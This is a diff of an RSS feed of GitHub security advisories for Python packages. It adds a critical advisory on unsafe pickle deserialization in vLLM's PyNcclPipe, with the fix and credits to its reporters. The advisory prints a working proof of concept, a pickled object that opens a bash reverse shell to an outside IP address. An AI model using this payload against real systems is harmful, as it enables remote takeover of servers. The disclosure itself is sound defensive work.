@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-05-20T18:02:01.968Z</updated>
+    <updated>2025-05-20T19:01:20.460Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,95 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[vllm] vLLM Allows Remote Code Execution via PyNcclPipe Communication Service]]></title>
+        <id>https://github.com/advisories/GHSA-hjq4-87xh-g4fv</id>
+        <link href="https://github.com/advisories/GHSA-hjq4-87xh-g4fv"/>
+        <updated>2025-05-20T18:04:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impacted-environments">Impacted Environments</h3>
+<p>This issue ONLY impacts environments using the <code>PyNcclPipe</code> KV cache transfer integration with the V0 engine. No other configurations are affected.</p>
+<h3 id="summary">Summary</h3>
+<p>vLLM supports the use of the&nbsp;<code>PyNcclPipe</code>&nbsp;class to establish a peer-to-peer communication domain for data transmission between distributed nodes. The GPU-side KV-Cache transmission is implemented through the&nbsp;<code>PyNcclCommunicator</code>&nbsp;class, while CPU-side control message passing is handled via the&nbsp;<code>send_obj</code>&nbsp;and&nbsp;<code>recv_obj</code>&nbsp;methods on the CPU side.​ </p>
+<p>A remote code execution vulnerability exists in the <code>PyNcclPipe</code> service. Attackers can exploit this by sending malicious serialized data to gain server control privileges. </p>
+<p>The intention was that this interface should only be exposed to a private network using the IP address specified by the <code>--kv-ip</code> CLI parameter. The vLLM documentation covers how this must be limited to a secured network: <a href="https://docs.vllm.ai/en/latest/deployment/security.html">https://docs.vllm.ai/en/latest/deployment/security.html</a></p>
+<p>Unfortunately, the default behavior from PyTorch is that the <code>TCPStore</code> interface will listen on ALL interfaces, regardless of what IP address is provided. The IP address given was only used as a client-side address to use. vLLM was fixed to use a workaround to force the <code>TCPStore</code> instance to bind its socket to a specified private interface.</p>
+<p>This issue was reported privately to PyTorch and they determined that this behavior was intentional.</p>
+<h3 id="details">Details</h3>
+<p>The <code>PyNcclPipe</code>  implementation contains a critical security flaw where it directly processes client-provided data using <code>pickle.loads</code>  , creating an unsafe deserialization vulnerability that can lead to ​Remote Code Execution.</p>
+<ol>
+<li>Deploy a <code>PyNcclPipe</code> service configured to listen on port <code>18888</code> when launched:</li>
+</ol>
+<pre><code class="language-python">from vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe import PyNcclPipe
+from vllm.config import KVTransferConfig
+
+config=KVTransferConfig(
+    kv_ip="0.0.0.0",
+    kv_port=18888,
+    kv_rank=0,
+    kv_parallel_size=1,
+    kv_buffer_size=1024,
+    kv_buffer_device="cpu"
+)
+
+p=PyNcclPipe(config=config,local_rank=0)
+p.recv_tensor() # Receive data
+</code></pre>
+<ol start="2">
+<li>The attacker crafts malicious packets and sends them to the <code>PyNcclPipe</code> service:</li>
+</ol>
+<pre><code class="language-python">from vllm.distributed.utils import StatelessProcessGroup
+
+class Evil:
+    def __reduce__(self):
+        import os
+        cmd='/bin/bash -c "bash -i &gt;&amp; /dev/tcp/172.28.176.1/8888 0&gt;&amp;1"'
+        return (os.system,(cmd,))
+
+client = StatelessProcessGroup.create(
+    host='172.17.0.1',
+    port=18888,
+    rank=1,
+    world_size=2,
+)
+
+client.send_obj(obj=Evil(),dst=0)
+</code></pre>
+<p>The call stack triggering ​RCE is as follows:</p>
+<pre><code>vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe.PyNcclPipe._recv_impl
+    -&gt; vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe.PyNcclPipe._recv_metadata
+        -&gt; vllm.distributed.utils.StatelessProcessGroup.recv_obj
+            -&gt; pickle.loads 
+</code></pre>
+<p>Getshell as follows: </p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/487746ee-3b77-4e4d-99cc-d1ca08431215"></p>
+<h3 id="reporters">Reporters</h3>
+<p>This issue was reported independently by three different parties:</p>
+<ul>
+<li>@kikayli (Zhuque Lab, Tencent)</li>
+<li>@omjeki</li>
+<li>Russell Bryant (@russellb)</li>
+</ul>
+<h3 id="fix">Fix</h3>
+<ul>
+<li><a href="https://github.com/vllm-project/vllm/pull/15988">https://github.com/vllm-project/vllm/pull/15988</a> -- vLLM now limits the <code>TCPStore</code> socket to the private interface as configured.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hjq4-87xh-g4fv">https://github.com/vllm-project/vllm/security/advisories/GHSA-hjq4-87xh-g4fv</a></li>
+<li><a href="https://github.com/vllm-project/vllm/pull/15988">https://github.com/vllm-project/vllm/pull/15988</a></li>
+<li><a href="https://github.com/vllm-project/vllm/commit/0d6e187e88874c39cda7409cf673f9e6546893e7">https://github.com/vllm-project/vllm/commit/0d6e187e88874c39cda7409cf673f9e6546893e7</a></li>
+<li><a href="https://docs.vllm.ai/en/latest/deployment/security.html">https://docs.vllm.ai/en/latest/deployment/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-hjq4-87xh-g4fv">https://github.com/advisories/GHSA-hjq4-87xh-g4fv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hjq4-87xh-g4fv</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-05-20T18:04:30.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[langroid] Langroid has a Code Injection vulnerability in LanceDocChatAgent through vector_store]]></title>
         <id>https://github.com/advisories/GHSA-22c2-9gwg-mj59</id>
@@ -463,32 +552,6 @@ label_config=%3cView%3e%3cText%20name%3d%22text%22%20value%3d%22$textjmwwi%26lt%
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-05-15T16:21:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[reflex] Reflex vulnerable to private state fields modification]]></title>
-        <id>https://github.com/advisories/GHSA-rf8x-9mhr-49wg</id>
-        <link href="https://github.com/advisories/GHSA-rf8x-9mhr-49wg"/>
-        <updated>2025-05-15T16:15:20.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A user on the website can modify any private field on their own state.</p>
-<h3 id="details">Details</h3>
-<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>
-<h3 id="impact">Impact</h3>
-<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>
-<li><a href="https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>
-<li><a href="https://github.com/advisories/GHSA-rf8x-9mhr-49wg">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rf8x-9mhr-49wg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-05-15T16:15:19.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[reflex] Reflex vulnerable to private state fields modification]]></title>
